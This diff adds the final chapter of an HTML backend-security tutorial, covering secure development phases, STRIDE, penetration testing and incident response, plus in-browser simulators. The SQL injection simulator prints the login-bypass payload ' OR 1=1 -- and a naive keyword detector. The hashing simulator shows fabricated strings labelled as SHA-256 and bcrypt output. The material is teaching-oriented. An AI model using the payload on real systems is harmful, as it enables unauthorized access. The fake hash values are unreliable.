+      <p>The 7 phases of a Secure Software Development Lifecycle:</p>
+      <table class="data-table">
+        <thead><tr><th>Phase</th><th>Security Activity</th></tr></thead>
+        <tbody>
+          <tr><td><strong style="color:var(--cyan)">1. Requirements</strong></td><td>Define security requirements alongside functional requirements. What data must be protected? Who must NOT have access?</td></tr>
+          <tr><td><strong style="color:var(--cyan)">2. Design</strong></td><td>Threat modeling. Draw the system and identify every attack path before writing a single line of code.</td></tr>
+          <tr><td><strong style="color:var(--cyan)">3. Development</strong></td><td>Secure coding practices, code reviews, static analysis tools that flag dangerous patterns.</td></tr>
+          <tr><td><strong style="color:var(--cyan)">4. Testing</strong></td><td>Security testing, penetration testing, dependency scanning, DAST (Dynamic Application Security Testing).</td></tr>
+          <tr><td><strong style="color:var(--cyan)">5. Deployment</strong></td><td>Infrastructure hardening, secrets management, security header configuration, WAF setup.</td></tr>
+          <tr><td><strong style="color:var(--cyan)">6. Maintenance</strong></td><td>Monitoring, alerting, dependency updates, regular security reviews and audits.</td></tr>
+          <tr><td><strong style="color:var(--cyan)">7. Retirement</strong></td><td>Securely decommission old systems. Wipe data, revoke credentials, archive logs.</td></tr>
+        </tbody>
+      </table>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">10.2 -- Threat Modeling</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Architect Who Draws the Fire Escape First</div>
+        <p>A responsible architect draws the fire escape, sprinkler system, and emergency exits into the building plans BEFORE construction begins. They do not wait for the building to burn down and then figure out where to put the exits. Threat modeling is drawing the security plan before the first line of code is written.</p>
+      </div>
+      <p>The <strong>STRIDE</strong> framework is the most widely used threat modeling approach. For each component in your system, ask:</p>
+      <ul class="bullet-list">
+        <li><strong>S -- Spoofing</strong>: Can someone pretend to be another user or system?</li>
+        <li><strong>T -- Tampering</strong>: Can someone modify data in transit or at rest without detection?</li>
+        <li><strong>R -- Repudiation</strong>: Can a user deny performing an action? (Are you logging enough to prove they did?)</li>
+        <li><strong>I -- Information Disclosure</strong>: Can sensitive data be exposed to unauthorized parties?</li>
+        <li><strong>D -- Denial of Service</strong>: Can an attacker make the system unavailable?</li>
+        <li><strong>E -- Elevation of Privilege</strong>: Can a regular user gain admin-level access?</li>
+      </ul>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">10.3 -- Penetration Testing</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Professional Lock Picker</div>
+        <p>You hire a professional lock picker to test your building's security BEFORE a criminal does. They try every door, every window, every possible entry point. They write a detailed report of every weakness they found. You fix those weaknesses. Then you are far more confident about the building's security than if you had just assumed it was safe.</p>
+      </div>
+      <p>Types of penetration tests:</p>
+      <ul class="bullet-list">
+        <li><strong>Black Box</strong> -- the tester has zero knowledge of the system. They approach it exactly as an external attacker would. Most realistic, slowest.</li>
+        <li><strong>Grey Box</strong> -- the tester has some knowledge (e.g., user credentials or API documentation). Balanced between realism and efficiency.</li>
+        <li><strong>White Box</strong> -- the tester has full access to source code, architecture diagrams, and credentials. Fastest and most thorough, but less realistic.</li>
+      </ul>
+      <div class="tip-box">
+        <div class="tip-label">OWASP Top 10</div>
+        <p>The OWASP Top 10 is the definitive list of the most critical web application security risks, updated every few years by thousands of security professionals worldwide. It is the starting checklist for every security review. Every topic in this guide is either on the OWASP Top 10 or closely related to it.</p>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">10.4 -- Incident Response</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Hospital Emergency Room</div>
+        <p>A hospital does not build its emergency room DURING an emergency. The room exists, the staff are trained, the protocols are practiced, the equipment is ready. When a patient comes in, everyone knows exactly what to do without needing to think about it. Incident response is the ER for security breaches. You plan and practice BEFORE the breach happens.</p>
+      </div>
+      <p>The 6 phases of incident response:</p>
+      <ol class="num-list">
+        <li><strong>Preparation</strong> -- build the incident response plan, train the team, establish communication channels, set up monitoring and alerting</li>
+        <li><strong>Identification</strong> -- detect the breach, understand its scope, confirm it is a real incident and not a false alarm</li>
+        <li><strong>Containment</strong> -- stop the bleeding. Isolate affected systems to prevent the attacker from moving further into the network.</li>
+        <li><strong>Eradication</strong> -- remove the attacker's access. Patch the vulnerability. Delete malware. Reset compromised credentials.</li>
+        <li><strong>Recovery</strong> -- restore systems from clean backups. Verify systems are clean before bringing them back online.</li>
+        <li><strong>Lessons Learned</strong> -- post-mortem. What happened? Why? What will prevent this exact attack from succeeding again?</li>
+      </ol>
+
+      <div class="warning-box">
+        <div class="warning-label">What NOT to Do When Breached</div>
+        <p>Do NOT delete logs -- they are your evidence. Do NOT immediately take everything offline without a plan -- this can make things worse. Do NOT hide the breach from customers and regulators -- this is often illegal and always destroys trust permanently. Do NOT pay a ransom without consulting security experts -- it does not guarantee anything and funds future attacks.</p>
+      </div>
+
+      <div class="divider"></div>
+
+      <div style="text-align:center; padding: 20px 0;">
+        <div style="font-size: 1.1rem; font-weight: 700; color: var(--cyan); margin-bottom: 8px;">You have completed CyberVault.</div>
+        <div style="color: var(--text2); font-size: 0.9rem; max-width: 500px; margin: 0 auto; line-height: 1.6;">You now understand the 10 core domains of backend security. Go back to any chapter when you need a refresher. Keep building, keep learning, and remember -- security is a process, not a destination.</div>
+      </div>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 10 of 10 &nbsp;|&nbsp; CyberVault -- Backend Security Mastery</div>
+      <div class="page-nav">
+        <a href="#ch9">&lt;-- Chapter 09</a>
+        <a href="#overview">Back to Overview</a>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end book-wrap -->
+
+<script>
+  // ===== SIDEBAR TOGGLE (mobile/iPad) =====
+  function toggleSidebar() {
+    var sidebar = document.getElementById('sidebar');
+    var overlay = document.getElementById('overlay');
+    sidebar.classList.toggle('open');
+    overlay.classList.toggle('open');
+  }
+
+  // ===== ACTIVE NAV LINK TRACKING ON SCROLL =====
+  var sections = ['overview','ch1','ch2','ch3','ch4','ch5','ch6','ch7','ch8','ch9','ch10'];
+  var navLinks = {};
+  sections.forEach(function(id) {
+    navLinks[id] = document.querySelector('.sidebar nav a[href="#' + id + '"]');
+  });
+
+  function updateActiveNav() {
+    var scrollY = window.scrollY || window.pageYOffset;
+    var currentSection = 'overview';
+    sections.forEach(function(id) {
+      var el = document.getElementById(id);
+      if (el && el.getBoundingClientRect().top <= 120) {
+        currentSection = id;
+      }
+    });
+    Object.keys(navLinks).forEach(function(id) {
+      if (navLinks[id]) navLinks[id].classList.remove('active');
+    });
+    if (navLinks[currentSection]) navLinks[currentSection].classList.add('active');
+  }
+  window.addEventListener('scroll', updateActiveNav, { passive: true });
+
+  // ===== PASSWORD HASHING SIMULATOR =====
+  function doHash() {
+    var pw = document.getElementById('hash-input').value || 'mypassword';
+    var out = document.getElementById('hash-output');
+    var h = 0;
+    for (var i = 0; i < pw.length; i++) {
+      h = Math.imul(31, h) + pw.charCodeAt(i) | 0;
+    }
+    var hex = Math.abs(h).toString(16).padStart(8,'0');
+    var sha = (hex + hex + hex + hex + hex + hex + hex + hex).substring(0, 64);
+    var salt1 = 'rAnDoM$aLt#' + Math.abs(h * 7).toString(16).substring(0,10);
+    var salt2 = 'UniQuE$aLt!' + Math.abs(h * 13).toString(16).substring(0,10);
+    var b1 = (Math.abs(h * 3 + 17)).toString(16).padStart(8,'0');
+    var b2 = (Math.abs(h * 7 + 41)).toString(16).padStart(8,'0');
+    var bcrypt1 = '$2b$12$' + salt1 + b1 + b2 + 'xA3mP';
+    var bcrypt2 = '$2b$12$' + salt2 + b2 + b1 + 'qZ9wK';
+
+    out.textContent =
+      'Password: "' + pw + '"\n\n' +
+      'SHA-256 Hash (no salt -- always the same):\n' + sha + '\n\n' +
+      'bcrypt Hash #1 (with unique random salt):\n' + bcrypt1 + '\n\n' +
+      'bcrypt Hash #2 (same password, different salt):\n' + bcrypt2 + '\n\n' +
+      'Notice: SHA-256 is always identical for the same password.\n' +
+      'bcrypt generates a completely different hash each time.\n' +
+      'That is what the salt does -- it makes every hash unique.';
+    out.className = 'sim-output';
+  }
+
+  // ===== SQL INJECTION SIMULATOR =====
+  function doSQLi() {
+    var username = document.getElementById('sqli-input').value || 'alice';
+    var out = document.getElementById('sqli-output');
+    var query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '[entered_password]'";
+    var isInjection = (
+      username.indexOf("'") !== -1 ||
+      username.toLowerCase().indexOf(' or ') !== -1 ||
+      username.indexOf('--') !== -1 ||
+      username.indexOf(';') !== -1 ||
+      username.indexOf('1=1') !== -1
+    );
+    if (isInjection) {
+      out.className = 'sim-output danger';
+      out.textContent =
+        'WARNING: SQL INJECTION DETECTED!\n\n' +
+        'Constructed SQL query:\n' + query + '\n\n' +
+        "Breakdown of the attack:\n" +
+        "  The ' character closes the string early\n" +
+        "  OR 1=1 is always TRUE -- every user matches\n" +
+        "  -- comments out everything after, including the password check\n\n" +
+        'RESULT: The entire users table is returned.\n' +
+        'Login is bypassed without a valid password.\n\n' +
+        'FIX: Use parameterized queries. Never concatenate user input into SQL.';
+    } else {
+      out.className = 'sim-output';
+      out.textContent =
+        'Safe query constructed:\n' + query + '\n\n' +
+        'The username "' + username + '" is treated as a plain string value.\n' +
+        'No special characters to exploit. Normal login check proceeds.\n\n' +
+        'Now try typing:   \' OR 1=1 --\n' +
+        'and click Test Login again to see the injection.';
+    }
+  }
+
+  // ===== RATE LIMITING SIMULATOR =====
+  var reqCount = 0;
+  var rateLimitOn = true;
+  var windowStart = Date.now();
+
+  function toggleRateLimit() {
+    rateLimitOn = !rateLimitOn;
+    var btn = document.getElementById('rate-toggle');
+    if (rateLimitOn) {
+      btn.textContent = 'Rate Limiting: ON';
+      btn.style.background = 'linear-gradient(135deg, #004400, #00e676)';
+    } else {
+      btn.textContent = 'Rate Limiting: OFF';
+      btn.style.background = 'linear-gradient(135deg, #440000, #ff1744)';
+    }
+    reqCount = 0;
+    windowStart = Date.now();
+    document.getElementById('rate-output').className = 'sim-output';
+    document.getElementById('rate-output').textContent = 'Rate limiter toggled. Click "Send Request" to test.';
+  }
+
+  function sendRequest() {
+    var now = Date.now();
+    if (now - windowStart > 5000) {
+      reqCount = 0;
+      windowStart = now;
+    }
+    reqCount++;
+    var out = document.getElementById('rate-output');
+    if (rateLimitOn && reqCount > 10) {
+      out.className = 'sim-output danger';
+      out.textContent =
+        'HTTP 429 -- Too Many Requests\n\n' +
+        'Requests in last 5 seconds: ' + reqCount + ' / 10 limit\n\n' +
+        'The rate limiter is blocking this request.\n' +
+        'Retry-After: 5 seconds\n\n' +
+        'The server is protected. The flood attack is stopped.';
+    } else if (!rateLimitOn && reqCount > 10) {
+      out.className = 'sim-output danger';
+      out.textContent =
+        'SERVER OVERLOADED!\n\n' +
+        'Requests in last 5 seconds: ' + reqCount + ' (no limit!)\n\n' +
+        'CPU: ' + Math.min(100, reqCount * 9) + '%\n' +
+        'Memory: CRITICAL\n' +
+        'Response time: ' + (reqCount * 120) + 'ms (increasing)\n\n' +
+        'Without rate limiting, this flood attack is succeeding.\n' +
+        'Turn Rate Limiting ON to see the protection in action.';
+    } else {
+      out.className = 'sim-output';
+      out.textContent =
+        'HTTP 200 -- OK\n\n' +
+        'Requests in last 5 seconds: ' + reqCount + ' / 10 limit\n' +
+        'Response time: ' + (Math.floor(Math.random() * 40) + 10) + 'ms\n' +
+        'Server status: Healthy\n\n' +
+        (rateLimitOn ? 'Rate limiting is active. Keep clicking to hit the limit.' : 'Rate limiting is OFF. Keep clicking to see what happens.');
+    }
+  }
+</script>
+
+</body>
+</html>
